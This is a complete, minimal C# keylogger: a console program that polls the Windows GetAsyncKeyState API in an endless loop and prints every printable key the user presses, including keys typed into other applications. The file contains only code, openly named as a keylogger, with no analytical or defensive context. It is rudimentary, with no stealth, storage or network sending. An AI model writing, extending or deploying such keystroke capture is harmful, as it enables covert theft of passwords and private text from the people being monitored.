using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
    class SimpleKeyLogger
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            Console.WriteLine("Start");
            while (true)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        Console.Write((char)i);
                    }
                }
            }
        }
    }
}
